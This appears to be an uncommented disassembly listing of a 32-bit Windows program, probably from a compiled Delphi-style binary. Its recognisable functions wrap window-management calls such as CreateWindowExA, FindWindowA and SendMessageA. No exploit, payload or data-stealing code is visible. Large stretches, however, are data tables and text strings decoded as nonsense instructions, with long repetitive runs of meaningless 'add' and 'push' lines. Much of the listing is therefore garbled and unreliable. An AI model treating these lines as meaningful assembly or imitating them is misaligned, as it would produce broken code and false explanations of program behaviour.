add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405f18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f44
retn
sub_405f50
push esp
pop edi
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
push eax
pop edi
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
push ebx
dec eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec eax
add [ ebx + 0x4425ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
dec eax
add [ ebx + 0x3825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x3425ffc0 ] cl
push ebx
sar bh 0x25
cmp al 0x53
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec eax
add [ ebx + 0x3025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x2825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x2425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x2025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x1825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x1425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x1025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0xc25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x25ffc0 ] cl
push ebx
dec eax
add [ ebx - 0x3da0040 ] cl
push edx
dec eax
add [ ebx - 0x7da0040 ] cl
push edx
dec eax
add [ ebx - 0xbda0040 ] cl
push edx
dec eax
add [ ebx - 0xfda0040 ] cl
push edx
dec eax
add [ ebx - 0x13da0040 ] cl
push edx
dec eax
add [ ebx - 0x17da0040 ] cl
push edx
dec eax
add [ ebx - 0x1bda0040 ] cl
push edx
dec eax
add [ ebx - 0x1fda0040 ] cl
push edx
dec eax
add [ ebx - 0x23da0040 ] cl
push edx
dec eax
add [ ebx - 0x27da0040 ] cl
push edx
dec eax
add [ ebx - 0x2bda0040 ] cl
push edx
dec eax
add [ ebx - 0x2fda0040 ] cl
push edx
dec eax
add [ ebx - 0x33da0040 ] cl
push edx
dec eax
add [ ebx - 0x37da0040 ] cl
push edx
dec eax
add [ ebx - 0x3bda0040 ] cl
push edx
dec eax
add [ ebx - 0x3fda0040 ] cl
push edx
dec eax
add [ ebx - 0x43da0040 ] cl
push edx
dec eax
add [ ebx - 0x47da0040 ] cl
push edx
dec eax
add [ ebx - 0x4bda0040 ] cl
push edx
dec eax
add [ ebx - 0x4fda0040 ] cl
push edx
dec eax
add [ ebx - 0x53da0040 ] cl
push edx
dec eax
add [ ebx - 0x57da0040 ] cl
push edx
dec eax
add [ ebx - 0x5bda0040 ] cl
push edx
dec eax
add [ ebx - 0x5fda0040 ] cl
push edx
dec eax
add [ ebx - 0x63da0040 ] cl
push edx
dec eax
add [ ebx - 0x67da0040 ] cl
push edx
dec eax
add [ ebx - 0x6bda0040 ] cl
push edx
dec eax
add [ ebx - 0x6fda0040 ] cl
push edx
dec eax
add [ ebx - 0x73da0040 ] cl
push edx
dec eax
add [ ebx - 0x77da0040 ] cl
push edx
dec eax
add [ ebx - 0x7bda0040 ] cl
push edx
dec eax
add [ ebx - 0x7fda0040 ] cl
push edx
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x7825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x7425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x7025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x5825ffc0 ] cl
push ebx
dec eax
add [ ebx - 0x6fda0040 ] cl
push esp
dec eax
add [ ebx - 0x73da0040 ] cl
push esp
dec eax
add [ ebx - 0x77da0040 ] cl
push esp
dec eax
add [ ebx - 0x7bda0040 ] cl
push esp
dec eax
add [ ebx - 0x7fda0040 ] cl
push esp
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x7825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x7425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x7025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x4825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x4425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x4025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x3825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x3425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x3025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1025ffc0 ] cl
push esp
dec eax
add [ ebx + 0xc25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x25ffc0 ] cl
push esp
dec eax
add [ ebx - 0x3da0040 ] cl
push ebx
dec eax
add [ ebx - 0x7da0040 ] cl
push ebx
dec eax
add [ ebx - 0xbda0040 ] cl
push ebx
dec eax
add [ ebx - 0xfda0040 ] cl
push ebx
dec eax
add [ ebx - 0x13da0040 ] cl
push ebx
dec eax
add [ ebx - 0x17da0040 ] cl
push ebx
dec eax
add [ ebx - 0x1bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x1fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x23da0040 ] cl
push ebx
dec eax
add [ ebx - 0x27da0040 ] cl
push ebx
dec eax
add [ ebx - 0x2bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x2fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x33da0040 ] cl
push ebx
dec eax
add [ ebx - 0x37da0040 ] cl
push ebx
dec eax
add [ ebx - 0x3bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x3fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x43da0040 ] cl
push ebx
dec eax
add [ ebx - 0x47da0040 ] cl
push ebx
dec eax
add [ ebx - 0x4bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x4fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x53da0040 ] cl
push ebx
dec eax
add [ ebx - 0x57da0040 ] cl
push ebx
dec eax
add [ ebx - 0x5bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x5fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x63da0040 ] cl
push ebx
dec eax
add [ ebx - 0x67da0040 ] cl
push ebx
dec eax
add [ ebx - 0x6bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x6fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x73da0040 ] cl
push ebx
dec eax
add [ ebx - 0x77da0040 ] cl
push ebx
dec eax
add [ ebx - 0x7bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x7fda0040 ] cl
push ebx
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x7825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x7425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x6825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push edi
dec eax
add [ ebx + 0x5825ffc0 ] cl
push edi
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push edi
dec eax
add [ ebx + 0x4025ffc0 ] cl
push edi
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push edi
dec eax
add [ ebx + 0x3825ffc0 ] cl
push edi
dec eax
add [ ebx + 0x3425ffc0 ] cl
push edi
dec eax
add [ ebx + 0x4825ffc0 ] cl
push edi
dec eax
add [ ebx + 0x4425ffc0 ] cl
push edi
dec eax
add [ ebx + 0x5425ffc0 ] cl
push edi
dec eax
add [ ebx + 0x5025ffc0 ] cl
push edi
dec eax
add [ ebx + 0x3025ffc0 ] cl
push edi
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push edi
dec eax
add [ ebx + 0x2825ffc0 ] cl
push edi
dec eax
add [ ebx + 0x2425ffc0 ] cl
push edi
dec eax
add [ ebx + 0x2025ffc0 ] cl
push edi
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push edi
dec eax
add [ ebx + 0x1825ffc0 ] cl
push edi
dec eax
add [ ebx + 0x1425ffc0 ] cl
push edi
dec eax
add [ ebx + 0x1025ffc0 ] cl
push edi
dec eax
add [ ebx + 0xc25ffc0 ] cl
push edi
dec eax
add [ ebx + 0x825ffc0 ] cl
push edi
dec eax
add [ ebx + 0x425ffc0 ] cl
push edi
dec eax
add [ ebx + 0x25ffc0 ] cl
push edi
dec eax
add [ ebx - 0x3da0040 ] cl
push esi
dec eax
add [ ebx - 0x7da0040 ] cl
push esi
dec eax
add [ ebx - 0xbda0040 ] cl
push esi
dec eax
add [ ebx - 0xfda0040 ] cl
push esi
dec eax
add [ ebx - 0x13da0040 ] cl
push esi
dec eax
add [ ebx - 0x17da0040 ] cl
push esi
dec eax
add [ ebx - 0x1bda0040 ] cl
push esi
dec eax
add [ ebx - 0x1fda0040 ] cl
push esi
dec eax
add [ ebx - 0x23da0040 ] cl
push esi
dec eax
add [ ebx - 0x27da0040 ] cl
push esi
dec eax
add [ ebx - 0x2bda0040 ] cl
push esi
dec eax
add [ ebx - 0x2fda0040 ] cl
push esi
dec eax
add [ ebx - 0x33da0040 ] cl
push esi
dec eax
add [ ebx - 0x37da0040 ] cl
push esi
dec eax
add [ ebx - 0x3bda0040 ] cl
push esi
dec eax
add [ ebx - 0x3fda0040 ] cl
push esi
dec eax
add [ ebx - 0x43da0040 ] cl
push esi
dec eax
add [ ebx - 0x47da0040 ] cl
push esi
dec eax
add [ ebx - 0x4bda0040 ] cl
push esi
dec eax
add [ ebx - 0x4fda0040 ] cl
push esi
dec eax
add [ ebx - 0x53da0040 ] cl
push esi
dec eax
add [ ebx - 0x57da0040 ] cl
push esi
dec eax
add [ ebx - 0x5bda0040 ] cl
push esi
dec eax
add [ ebx - 0x5fda0040 ] cl
push esi
dec eax
add [ ebx - 0x63da0040 ] cl
push esi
dec eax
add [ ebx - 0x67da0040 ] cl
push esi
dec eax
add [ ebx - 0x6bda0040 ] cl
push esi
dec eax
add [ ebx - 0x6fda0040 ] cl
push esi
dec eax
add [ ebx - 0x73da0040 ] cl
push esi
dec eax
add [ ebx - 0x77da0040 ] cl
push esi
dec eax
add [ ebx - 0x7bda0040 ] cl
push esi
dec eax
add [ ebx - 0x7fda0040 ] cl
push esi
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x7825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x7425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x7025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1025ffc0 ] cl
push esi
dec eax
add [ ebx + 0xc25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push esi
dec eax
add [ ebx - 0x3da0040 ] cl
push ebp
dec eax
add [ ebx - 0x7da0040 ] cl
push ebp
dec eax
add [ ebx - 0xbda0040 ] cl
push ebp
dec eax
add [ ebx - 0xfda0040 ] cl
push ebp
dec eax
add [ ebx - 0x13da0040 ] cl
push ebp
dec eax
add [ ebx - 0x17da0040 ] cl
push ebp
dec eax
add [ ebx - 0x17da0040 ] cl
push ebp
dec eax
add [ ebx - 0x1bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x1fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x23da0040 ] cl
push ebp
dec eax
add [ ebx - 0x27da0040 ] cl
push ebp
dec eax
add [ ebx - 0x2bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x2fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x33da0040 ] cl
push ebp
dec eax
add [ ebx - 0x37da0040 ] cl
push ebp
dec eax
add [ ebx - 0x3bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x3fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x43da0040 ] cl
push ebp
dec eax
add [ ebx - 0x47da0040 ] cl
push ebp
dec eax
add [ ebx - 0x4bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x4fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x53da0040 ] cl
push ebp
dec eax
add [ ebx - 0x57da0040 ] cl
push ebp
dec eax
add [ ebx - 0x5bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x5fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x63da0040 ] cl
push ebp
dec eax
add [ ebx - 0x67da0040 ] cl
push ebp
dec eax
add [ ebx - 0x6bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x6fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x73da0040 ] cl
push ebp
dec eax
add [ ebx - 0x77da0040 ] cl
push ebp
dec eax
add [ ebx - 0x7bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x7fda0040 ] cl
push ebp
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x7825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x7425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x5825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x5425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x5025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0xc25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x25ffc0 ] cl
push ebp
dec eax
add [ ebx - 0x3da0040 ] cl
push esp
dec eax
add [ ebx - 0x7da0040 ] cl
push esp
dec eax
add [ ebx - 0xbda0040 ] cl
push esp
dec eax
add [ ebx - 0xfda0040 ] cl
push esp
dec eax
add [ ebx - 0x13da0040 ] cl
push esp
dec eax
add [ ebx - 0x17da0040 ] cl
push esp
dec eax
add [ ebx - 0x1bda0040 ] cl
push esp
dec eax
add [ ebx - 0x1fda0040 ] cl
push esp
dec eax
add [ ebx - 0x23da0040 ] cl
push esp
dec eax
add [ ebx - 0x27da0040 ] cl
push esp
dec eax
add [ ebx - 0x2bda0040 ] cl
push esp
dec eax
add [ ebx - 0x2fda0040 ] cl
push esp
dec eax
add [ ebx - 0x33da0040 ] cl
push esp
dec eax
add [ ebx - 0x37da0040 ] cl
push esp
dec eax
add [ ebx - 0x3bda0040 ] cl
push esp
dec eax
add [ ebx - 0x3fda0040 ] cl
push esp
dec eax
add [ ebx - 0x43da0040 ] cl
push esp
dec eax
add [ ebx - 0x47da0040 ] cl
push esp
dec eax
add [ ebx - 0x4bda0040 ] cl
push esp
dec eax
add [ ebx - 0x4fda0040 ] cl
push esp
dec eax
add [ ebx - 0x53da0040 ] cl
push esp
dec eax
add [ ebx - 0x57da0040 ] cl
push esp
dec eax
add [ ebx - 0x5bda0040 ] cl
push esp
dec eax
add [ ebx - 0x5fda0040 ] cl
push esp
dec eax
add [ ebx - 0x63da0040 ] cl
push esp
dec eax
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x4c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x4825ffc0 ] cl
push ebx
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
add al 0x60
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x4025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push ebx
mov eax eax
add edx [ eax + 0x5f ]
inc eax
add [ ebx + 0x2425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x2025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5025ffc0 ] cl
push ebx
dec eax
sub_406b50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a70
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a60
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406ba8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a70
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a60
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406c00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406cf5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406d1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d24
retn
sub_406d30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406d55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d5c
retn
sub_406d68
inc esi
dec eax
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch al
inc [ eax ]
